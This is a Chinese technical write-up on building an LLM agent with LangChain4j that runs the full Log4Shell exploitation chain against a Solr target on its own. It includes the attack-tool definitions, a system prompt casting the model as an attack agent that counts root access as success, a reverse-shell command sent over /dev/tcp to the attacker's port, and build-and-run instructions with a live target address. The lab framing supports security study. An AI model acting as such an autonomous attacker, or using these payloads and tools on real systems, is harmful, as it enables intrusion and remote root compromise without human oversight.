## AI Agent版Log4shell——让 LLM 自主完成整条攻击链

### 1. 为什么要做这件事

在前面手动复现的过程中，验证变体payload时**真正花时间的不是执行动作，而是"看结果 → 判断 → 换下一个变体"这件事**。

这套判断目前由人来做，而它恰好是 LLM 擅长的一类工作——读工具返回观察结果，决定下一步调用什么。

于是就有了这套 AI 版工具箱：把先前的每个模块注册成"工具函数"，让 LLM 自己决定调用顺序和参数。

### 2. 分层：执行层与决策层

**执行层** ： 扫描 / LDAP服务 / HTTP服务 / 类生成 / Payload发送 / Shell监听  ——>

**将其包装成@Tool方法**  ——>

**决策层**（LangChain4j 1.19.0）：LLM ←→ AiServices ←→ 工具 ←→ 观察结果

执行层直接复用之前手工复现那套代码，增加了两个命中计数器：`MaliciousLDAPServer.searchHits` 数 SearchRequest、`HttpFileServer.httpHits` 数类的下载 —— 这两个计数器是用来让 LLM 的观察行动释放成功的。

### 3. 工具：

**每个@Tool 方法都是一个"行动原语"**

LangChain4j 的 `@Tool` 注解会把方法反射成 function calling 的 JSON Schema 发给模型。所以**方法名、参数名、描述都是"给 LLM 的提示词"**：

```java
@Tool("查询当前回调统计：LDAP 收到多少次 SearchRequest、HTTP 收到多少次类下载、"
    + "反弹 shell 是否已连回、已捕获的 shell 输出。这是判断 payload 是否命中的核心观察工具")
public String getCallbackStats() {
    StringBuilder sb = new StringBuilder();
    sb.append("ldapSearchHits=").append(MaliciousLDAPServer.getSearchHits());
    sb.append(" httpClassDownloads=").append(HttpFileServer.getHttpHits());
    ...
}
```

一共注册了 10 个工具，分成执行层与决策层两类：

| 类别 | 工具                                                         | 作用                                 |
| ---- | ------------------------------------------------------------ | ------------------------------------ |
| 观察 | `scanEndpoint`                                               | 端口状态 + JVM 版本                  |
| 观察 | `getCallbackStats`                                           | 回调计数与 shell 状态（LLM判断依据） |
| 观察 | `readShellOutput`                                            | 捕获的 shell 输出                    |
| 行动 | `generateExploitClass(command)`                              | 生成并编译恶意类                     |
| 行动 | `startLdapServer` / `startHttpServer` / `startShellListener` | 起三个服务                           |
| 行动 | `sendRawPayload`                                             | 发送任意 payload                     |
| 行动 | `listPayloadVariants` / `tryPayloadVariant`                  | 看变体目录并尝试一个变体             |

**需要注意**：**构建时必须加 `-parameters` 编译参数**。否则参数名不进字节码，LLM 拿到的工具参数是 `arg0`、`arg1`，function calling 不生效。

### 4. LLM自主决策，而不是硬编码顺序

之前的 8 个变体，在这里被做成了"目录 + 尝试"两个工具。尝试工具返回的结果考量标准是计数器的**前后差值**：

```java
int before = MaliciousLDAPServer.getSearchHits();
String sent = AttackTools.sendRaw(host, port, path, payload, timeoutMs);
int after = MaliciousLDAPServer.getSearchHits();
return "variant=" + v.id + " (" + v.name + ") payload=" + payload + "\n"
        + sent + "\n"
        + "ldapSearchHits " + before + " -> " + after
        + (after > before ? "  ★ 命中：JNDI lookup 已触发"
                          : "  未命中：LDAP 无回调");
```

这么做有两个好处：

- **LLM 不需要自己解析数字做比较**——`★ 命中` 是工具给出的结论，模型照读即可；
- **差值设计天然防重复计数**——同一个变体重复尝试，不会因为历史累计次数而误判命中。

工具还带了"护栏"：`requires=RMI_SERVER` 的 v08 会被直接拒绝执行并提示"勿选"，避免模型在一个必然失败的变体上空转。

### 5. 装配：系统提示词 + 记忆 + 工具

`AiServices` 是 LangChain4j 的 Agent 运行时发挥作用的，**它的作用是**：反射扫描 `@Tool` 方法生成 JSON Schema，动态生成 `Assistant` 代理对象，管理决策循环。

核心代码：

```java
public interface Assistant {
    @SystemMessage("""
            你是 Log4Shell（CVE-2021-44228）复现实验的自动化攻击代理……
            重要事实：
            - 目标运行 Solr + JDK 1.8.0_102，LDAP 远程 codebase 加载可用；
            - 攻击机监听约定端口：LDAP 1389、HTTP 8888、反弹 shell 4444；
            - 发送 payload 后返回 400 是正常现象……
            - 成功判据：getCallbackStats 的 shellOutput 中出现 uid=0(root)。
            """)
    String chat(String userMessage);
}

Assistant assistant = AiServices.builder(Assistant.class)
        .chatModel(model)
        .chatMemory(MessageWindowChatMemory.withMaxMessages(40))
        .tools(new AttackTools(), new PayloadVariantTool())
        .build();
```

这份系统提示词把之前试出来的经验**固化成了环境事实**：

- "400 是正常现象"：必须要告诉它，不写进去，模型很容易在第一个回合就判定"攻击失败"然后放弃；
- 约定端口与攻击机地址：避免模型自己定端口；
- 成功判据是 `uid=0(root)`，而不是"shell 连上了"；
- 变体选择建议：优先 v02（合法 DN），别选需要 RMI服务的（v08）。

这也说明了 AI 路线的一个本质：**Agent 不会自己发现这些协议细节，它只是把人类已经总结好的判据执行得更快、更一致。系统提示词的质量可以决定 Agent 的上限。**

### 6. 决策循环

AiServices 的循环非常简单：

```
LLM 生成 → 是文本？   → 结束，作为最终回答返回
         → 是工具调用？→ 反射执行 → 结果包成 ToolExecutionResultMessage 回填
                       → 带完整历史再问 LLM（循环）
```

Mock 模式跑出的 8 轮轨迹：

| 回合 | 工具调用                                                    | 观察结果                                        |
| ---- | ----------------------------------------------------------- | ----------------------------------------------- |
| 1    | `generateExploitClass("bash -i >& /dev/tcp/.../4444 0>&1")` | 生成 Exploit.class（Java 8）                    |
| 2    | `startLdapServer(1389)`                                     | LDAP 监听，codeBase 指向攻击机                  |
| 3    | `startHttpServer(8888)`                                     | HTTP 托管 exploit_dir                           |
| 4    | `startShellListener(4444)`                                  | 监听 4444，等待连回                             |
| 5    | `listPayloadVariants()`                                     | 拿到 8 个变体目录                               |
| 6    | `tryPayloadVariant("v02")`                                  | `ldapSearchHits 0 -> 1  ★ 命中`                 |
| 7    | `getCallbackStats()`                                        | shellConnected=true，shellOutput 含 uid=0(root) |
| 8    | 最终回答                                                    | 汇报命中结论                                    |

第 6 步选的是 v02 而不是 v01——模型读了变体目录里 v01 的判据（"部分版本会报 InvalidNameException"）之后跳过了它。**体现了"把变体做成工具"的价值所在。**

### 7. 离线自检

Agent 这类东西难验证，因为需要真实 LLM和真实靶机。这里的做法是**把两个外部依赖换成替身，其余用真实**：

- `MockChatModel`：假模型，按固定回合给出工具调用请求，不使用 LLM 服务；
- `FakeTargetServer`：假Solr 靶机，收到含 `${jndi:...}` 的请求回 400，并用一个LDAP 客户端（`LdapProbeClient`）**真的**去连 LDAP 服务器完成 bind/search 握手。

于是 `MaliciousLDAPServer.getSearchHits()` 的计数是真实的，**而不是模拟出来的**。

```
[PASS] 模型收到 8 次请求（7 次工具决策 + 1 次总结）
[PASS] 模拟靶机收到至少 1 次请求
[PASS] LDAP searchHits > 0（v02 变体命中，真实握手计数）
[PASS] 恶意类 Exploit.class 已生成
[PASS] 变体命中结果回填给模型（ToolExecutionResultMessage 含 ★ 命中）
[PASS] Agent 最终回答包含命中结论
[PASS] 触发顺序正确：tryPayloadVariant 在 getCallbackStats 之前
[PASS] Agent 离线自检全部通过（8 个决策回合）
```

```bash
java -cp target/agent-toolkit-1.0.0.jar agent.AgentTest     # 期望 8/8 PASS
java -jar target/agent-toolkit-1.0.0.jar --mock --target 127.0.0.1 --port 18080
```

### 8. 使用真实 LLM

```bash
export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
export PATH=/opt/maven/bin:$PATH
mvn -q package -DskipTests                      # 产出jar

# 任意 OpenAI 兼容后端（下面以本地 Ollama 为例）
export LLM_BASE_URL=http://localhost:11434/v1
export LLM_API_KEY=ollama
export LLM_MODEL=qwen2.5:7b
export ATTACKER_IP=$(hostname -I | awk '{print $1}')

java -jar target/agent-toolkit-1.0.0.jar --target 172.18.0.2 --port 8983 --path /solr/admin/cores
```

### 9. 总结

在这个项目中，把Log4Shell整个攻击链拆成一个个原子操作（扫描端点、发送 Payload等），注册成 AI 可调用的工具。工具被分成了“决策”和“执行”的部分：**AI 负责判断下一步该做什么，工具负责真正去做**。AI 通过 ReAct 循环——观察、推理、行动、再观察——自主决定调用哪个工具、用什么参数、什么时候换下一个变体。它不需要理解思考，只需要看回调计数的变化。

